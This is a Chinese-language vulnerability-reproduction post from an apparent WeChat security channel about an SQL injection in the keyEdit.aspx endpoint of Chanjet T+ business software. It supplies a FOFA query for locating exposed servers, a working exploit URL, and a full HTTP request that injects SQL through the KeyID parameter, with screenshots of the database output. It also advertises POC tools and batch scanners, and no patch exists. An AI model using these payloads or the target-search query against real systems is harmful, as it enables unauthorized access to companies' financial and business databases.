#  畅捷通TPlus keyEdit.aspx接口存在SQL注入漏洞   
南风徐来  南风漏洞复现文库   2024-05-07 22:57  
  
免责声明：请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
## 1. 畅捷通TPlus简介  
  
微信公众号搜索：南风漏洞复现文库 该文章 南风漏洞复现文库 公众号首发  
  
畅捷通T+专属云适用于需要一体化管理的企业，财务管理、业务管理、零售管理、生产管理、物流管理、移动仓管、营销管理、委外加工等人财货客一体化管理。  
## 2.漏洞描述  
  
畅捷通T+专属云适用于需要一体化管理的企业，财务管理、业务管理、零售管理、生产管理、物流管理、移动仓管、营销管理、委外加工等人财货客一体化管理。畅捷通TPlus keyEdit.aspx接口存在SQL注入漏洞。  
  
CVE编号:  
  
CNNVD编号:  
  
CNVD编号:  
## 3.影响版本  
  
畅捷通T+  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3bYdbZictWUicK6iaIecYLAbgiaw4A3PzfNnbaraicVSnnLMObBpHFJdiaCDJujqjswvfiaIbHEnw0AuyZXg/640?wx_fmt=jpeg&from=appmsg "null")  
  
畅捷通TPlus keyEdit.aspx接口存在SQL注入漏洞  
## 4.fofa查询语句  
  
app="畅捷通-TPlus"  
## 5.漏洞复现  
  
漏洞链接：https://xx.xx.xx.xx/tplus/UFAQD/keyEdit.aspx?KeyID=1%27%20and%201=(select%20sys.fn_varbintohexstr(hashbytes('MD5','1')))%20--&preload=1  
  
漏洞数据包：  
```
GET /tplus/UFAQD/keyEdit.aspx?KeyID=1%27%20and%201=(select%20@@version)%20--&preload=1 HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
Host: xx.xxx.xxx.xxx
Accept-Charset: utf-8
```  
  
执行select @@version  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3bYdbZictWUicK6iaIecYLAbgia4xndLppzS4hneicDeTGcnfMTOI6htSyM1fD0IL9gbXQr85zorLNzDRg/640?wx_fmt=jpeg&from=appmsg "null")  
  
执行select db_name()   
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3bYdbZictWUicK6iaIecYLAbgiacnb4O3qxcGvs8SVqI5OPYr2gpEXFey8icU5H5KW6zJLM7nJdSLyZSGg/640?wx_fmt=jpeg&from=appmsg "")  
## 6.POC&EXP  
  
关注公众号 南风漏洞复现文库 并回复 漏洞复现132 即可获得该POC工具下载地址：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3bYdbZictWUicK6iaIecYLAbgiaR9Uu1icmeAMVfyhgjH0AFA1icMxtWa5f6DzUjt3Q8vC8eMjwsPMThjzg/640?wx_fmt=jpeg&from=appmsg "null")  
  
本期漏洞及往期漏洞的批量扫描POC及POC工具箱已经上传知识星球：南风网络安全1: 更新poc批量扫描软件，承诺，一周更新8-14个插件吧，我会优先写使用量比较大程序漏洞。2: 免登录，免费fofa查询。3: 更新其他实用网络安全工具项目。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3bYdbZictWUicK6iaIecYLAbgia98LNCJxrZic0cbrTelQGicdQ0lYe83YI8lsacp3PN8RaGwq8Ay1mj1ibw/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3bYdbZictWUicK6iaIecYLAbgiaXgt8qcg60ib43ReWlR7FcvrSfzibJnia4uKO5zzR9kutXbY0WszaqdnXw/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3bYdbZictWUicK6iaIecYLAbgiajSLhg4u7ibGVCPFT4Vv20ntJH02Y0gJxTKncLjvVQiaYKQHQXIFevhbA/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3bYdbZictWUicK6iaIecYLAbgiaEvsZ1ANousVdCkLlOgh7LOXnJyVpAss2rPzc929w9Vcqq7XoAEXzkA/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3bYdbZictWUicK6iaIecYLAbgiaw35C8BPYkGUmKVmMkMc6ib8GWC1QG9EY8ArHUVdBugIvNwLtB5scl3g/640?wx_fmt=jpeg&from=appmsg "null")  
## 7.整改意见  
  
目前厂商尚未提供相关漏洞补丁链接，请关注厂商主页及时更新： https://www.chanjet.com/  
## 8.往期回顾  
  
  
[用友时空KSOA linksframe/linkadd.jsp接口存在SQL注入漏洞](http://mp.weixin.qq.com/s?__biz=MzIxMjEzMDkyMA==&mid=2247486420&idx=1&sn=554681943252463531f2ab502b1e6f50&chksm=974b86d3a03c0fc5023167ad95a810cde23c79b973d4541ad5a708b046f6356b2e165fcdec78&scene=21#wechat_redirect)  
  
  
[图创图书馆集群管理系统 updOpuserPw接口存在SQL注入漏洞](http://mp.weixin.qq.com/s?__biz=MzIxMjEzMDkyMA==&mid=2247486420&idx=2&sn=6a461c6f7a17fdcdb37ce5181a0437a8&chksm=974b86d3a03c0fc5b25d3592e1e135576bebb3f4f92b788e74d3ae43137f9747e135c7926705&scene=21#wechat_redirect)  
  
  
